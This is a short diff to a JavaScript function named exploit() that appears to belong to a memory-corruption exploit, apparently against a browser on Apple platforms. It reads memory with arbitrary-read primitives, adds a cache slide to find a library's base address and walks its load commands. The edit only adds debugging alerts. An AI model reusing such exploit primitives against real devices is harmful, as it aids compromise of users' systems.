@@ -702,8 +702,8 @@ function exploit(){
             };
             var base = Add(memory.read_i64(Add(imgs,m),0), cache_slide);
             alert("base" + base);
-            
-            if(opcode_libs.some(lib => strcmp(fn, lib)))
+            alert(opcode_libs.some())
+            if(opcode_libs.some(lib => strcmp(fn(i), lib)))
             {
                 var ncmds = memory.u32(Add(base, 0x10));
                 for(var j = 0, off = 0x20; j < ncmds; ++j)
